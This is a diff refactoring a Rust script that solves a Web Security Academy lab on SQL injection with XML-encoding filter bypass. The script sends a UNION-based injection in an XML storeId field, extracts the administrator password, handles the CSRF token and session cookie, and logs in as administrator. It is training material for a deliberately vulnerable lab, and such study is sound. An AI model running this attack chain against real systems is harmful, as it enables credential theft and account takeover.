@@ -1,28 +1,21 @@
-/***************************************************************************************
-*
-* Author: Ahmed Elqalaawy (@elqal3awii)
-*
-* Date: 27/9/2023
+/******************************************************************
 *
 * Lab: SQL injection with filter bypass via XML encoding
 *
-* Steps: 1. Inject payload into storeId XML element to retrieve administrator password
-*           using UNION-based attack
-*        2. Extract administrator password from the response body
-*        3. Fetch the login page
-*        4. Extract the csrf token and session cookie
-*        5. Login as the administrator
-*        6. Fetch the administrator profile
+* Hack Steps:
+*      1. Inject payload into storeId XML element to retrieve
+*         administrator password using UNION-based attack
+*      2. Extract administrator password from the response body
+*      3. Fetch the login page
+*      4. Extract the csrf token and session cookie
+*      5. Login as the administrator
+*      6. Fetch the administrator profile
 *
-****************************************************************************************/
-#![allow(unused)]
-/***********
-* Imports
-***********/
+*******************************************************************/
+use lazy_static::lazy_static;
 use regex::Regex;
 use reqwest::{
     blocking::{Client, ClientBuilder, Response},
-    header::HeaderMap,
     redirect::Policy,
 };
 use select::{document::Document, predicate::Attr};
@@ -33,19 +26,16 @@ use std::{
 };
 use text_colorizer::Colorize;
 
-/******************
-* Main Function
-*******************/
+// Change this to your lab URL
+const LAB_URL: &str = "https://0afe00d1037b1919815b481100e20074.web-security-academy.net";
+
+lazy_static! {
+    static ref WEB_CLIENT: Client = build_web_client();
+}
+
 fn main() {
-    // change this to your lab URL
-    let url = "https://0af80068031e1d5d820d1a8a00d4007a.web-security-academy.net";
+    println!("⦗#⦘ Injection point: {}", "storeId".yellow(),);
 
-    // build the client that will be used for all subsequent requests
-    let client = build_client();
-
-    println!("{} {}", "[#] Injection point:".blue(), "storeId".yellow(),);
-
-    // payload to retrieve administrator password
     let payload = r###"<?xml version="1.0" encoding="UTF-8"?>
     <stockCheck>
         <productId>
@@ -56,123 +46,51 @@ fn main() {
         </storeId>
     </stockCheck>"###;
 
-    print!(
-        "{}",
-        "1. Injecting payload to retrieve administrator password using UNION-based attack.. "
-            .white(),
-    );
-    io::stdout().flush();
+    print!("⦗1⦘ Injecting payload to retrieve administrator password using UNION-based attack.. ");
+    flush_terminal();
 
-    // fetch the page with the injected payload
-    let injection = client
-        .post(format!("{url}/product/stock"))
-        .header("Content-Type", "application/xml")
-        .body(payload)
-        .send()
-        .expect(&format!(
-            "{}",
-            "[!] Failed to fetch the page with the injected payload".red()
-        ));
+    let check_stock = check_stock_with_payload(payload.to_owned());
 
     println!("{}", "OK".green());
-    print!(
-        "{}",
-        "2. Extracting administrator password from the response.. ".white(),
-    );
-    io::stdout().flush();
+    print!("⦗2⦘ Extracting administrator password from the response.. ");
+    flush_terminal();
 
-    // get the body of the response
-    let body = injection.text().unwrap();
-
-    // extract administrator password.
-    // if the pattern not work, change it to "(.*)\n",
-    // it depends on how the password is retrieved, after the the number of units or before them
-    // the 2 scenarios occured when I made tests, so be ready to face either of them
-    let admin_password = capture_pattern("\n(.*)", &body).expect(&format!(
-        "{}",
-        "[!] Failed to extract administrator password".red()
-    ));
+    let body = check_stock.text().unwrap();
+    // If the pattern not work, change it to "(.*)\n",
+    // It depends on how the password is retrieved, after the the number of units or before them, and the two scenarios occur
+    let admin_password = capture_pattern_from_text("\n(.*)", &body);
 
     println!("{} => {}", "OK".green(), admin_password.yellow());
-    print!("{}", "3. Fetching login page.. ".white());
-    io::stdout().flush();
+    print!("⦗3⦘ Fetching the login page.. ");
+    flush_terminal();
 
-    // fetch the login page
-    let fetch_login = client
-        .get(format!("{url}/login"))
-        .send()
-        .expect(&format!("{}", "[!] Failed to fetch the login page".red()));
+    let login_page = fetch("/login");
 
     println!("{}", "OK".green());
-    print!(
-        "{}",
-        "4. Extracting the csrf token and session cookie.. ".white()
-    );
-    io::stdout().flush();
+    print!("⦗4⦘ Extracting the csrf token and session cookie.. ");
+    flush_terminal();
 
-    // extract session cookie
-    let session = extract_session_cookie(fetch_login.headers())
-        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
-
-    // extract the csrf token
-    let csrf =
-        extract_csrf(fetch_login).expect(&format!("{}", "[!] Failed to extract the csrf token".red()));
+    let session = get_session_cookie(&login_page);
+    let csrf_token = get_csrf_token(login_page);
 
     println!("{}", "OK".green());
-    print!("{}", "5. Logging in as the administrator.. ".white(),);
-    io::stdout().flush();
+    print!("⦗5⦘ Logging in as administrator.. ");
+    flush_terminal();
 
-    // login as the administrator
-    let admin_login = client
-        .post(format!("{url}/login"))
-        .form(&HashMap::from([
-            ("username", "administrator"),
-            ("password", &admin_password),
-            ("csrf", &csrf),
-        ]))
-        .header("Cookie", format!("session={session}"))
-        .send()
-        .expect(&format!(
-            "{}",
-            "[!] Failed to login as the administrator".red()
-        ));
+    let admin_login = login_as_admin(&admin_password, &session, &csrf_token);
 
     println!("{}", "OK".green());
+    print!("⦗6⦘ Fetching the administrator profile.. ");
+    flush_terminal();
 
-    // extract the new session
-    let new_session = extract_session_cookie(admin_login.headers()).expect(&format!(
-        "{}",
-        "[!] Failed to extract new session cookie".red()
-    ));
-
-    print!("{}", "6. Fetching the administrator profile.. ".white(),);
-    io::stdout().flush();
-
-    // fetch administrator page
-    let admin = client
-        .get(format!("{url}/my-account"))
-        .header("Cookie", format!("session={new_session}"))
-        .send()
-        .expect(&format!(
-            "{}",
-            "[!] Failed to fetch administrator profile".red()
-        ));
+    let admin_session = get_session_cookie(&admin_login);
+    fetch_with_session("/my-account", &admin_session);
 
     println!("{}", "OK".green());
-    println!(
-        "{} {}",
-        "🗹 The lab should be marked now as"
-            .white()
-            .bold(),
-        "solved".green().bold()
-    )
+    println!("🗹 The lab should be marked now as {}", "solved".green())
 }
 
-/*******************************************************************
-* Function used to build the client
-* Return a client that will be used in all subsequent requests
-********************************************************************/
-fn build_client() -> Client {
+fn build_web_client() -> Client {
     ClientBuilder::new()
         .redirect(Policy::none())
         .connect_timeout(Duration::from_secs(5))
@@ -180,52 +98,74 @@ fn build_client() -> Client {
         .unwrap()
 }
 
-/********************************************
-* Function to capture a pattern form a text
-*********************************************/
-fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
-    let pattern = Regex::new(pattern).unwrap();
-    if let Some(text) = pattern.captures(text) {
-        Some(text.get(1).unwrap().as_str().to_string())
-    } else {
-        None
-    }
+fn check_stock_with_payload(payload: String) -> Response {
+    WEB_CLIENT
+        .post(format!("{LAB_URL}/product/stock"))
+        .header("Content-Type", "application/xml")
+        .body(payload)
+        .send()
+        .expect(&format!(
+            "{}",
+            "⦗!⦘ Failed to fetch the page with the injected payload".red()
+        ))
 }
 
-/*************************************************
-* Function to extract csrf from the response body
-**************************************************/
-fn extract_csrf(res: Response) -> Option<String> {
-    if let Some(csrf) = Document::from(res.text().unwrap().as_str())
+fn fetch(path: &str) -> Response {
+    WEB_CLIENT
+        .get(format!("{LAB_URL}{path}"))
+        .send()
+        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
+}
+
+fn fetch_with_session(path: &str, session: &str) -> Response {
+    WEB_CLIENT
+        .get(format!("{LAB_URL}{path}"))
+        .header("Cookie", format!("session={session}"))
+        .send()
+        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
+}
+
+fn get_csrf_token(response: Response) -> String {
+    let document = Document::from(response.text().unwrap().as_str());
+    document
         .find(Attr("name", "csrf"))
         .find_map(|f| f.attr("value"))
-    {
-        Some(csrf.to_string())
-    } else {
-        None
-    }
+        .expect(&format!("{}", "⦗!⦘ Failed to get the csrf".red()))
+        .to_string()
 }
 
-/**********************************************************
-* Function to extract session field from the cookie header
-***********************************************************/
-fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
-    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
-    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
-        Some(session.as_str().to_string())
-    } else {
-        None
-    }
+fn get_session_cookie(response: &Response) -> String {
+    let headers = response.headers();
+    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
+    capture_pattern_from_text("session=(.*); Secure", cookie_header)
 }
 
-/*******************************************
-* Function to extract a pattern form a text
-********************************************/
-fn extract_pattern(pattern: &str, text: &str) -> Option<String> {
-    let pattern = Regex::new(pattern).unwrap();
-    if let Some(text) = pattern.find(text) {
-        Some(text.as_str().to_string())
-    } else {
-        None
-    }
+fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
+    let regex = Regex::new(pattern).unwrap();
+    let captures = regex.captures(text).expect(&format!(
+        "⦗!⦘ Failed to capture the pattern: {}",
+        pattern.red()
+    ));
+    captures.get(1).unwrap().as_str().to_string()
+}
+
+fn login_as_admin(admin_password: &str, session: &str, csrf_token: &str) -> Response {
+    WEB_CLIENT
+        .post(format!("{LAB_URL}/login"))
+        .form(&HashMap::from([
+            ("username", "administrator"),
+            ("password", admin_password),
+            ("csrf", &csrf_token),
+        ]))
+        .header("Cookie", format!("session={session}"))
+        .send()
+        .expect(&format!(
+            "{}",
+            "⦗!⦘ Failed to login as the administrator".red()
+        ))
+}
+
+#[inline(always)]
+fn flush_terminal() {
+    io::stdout().flush().unwrap();
 }
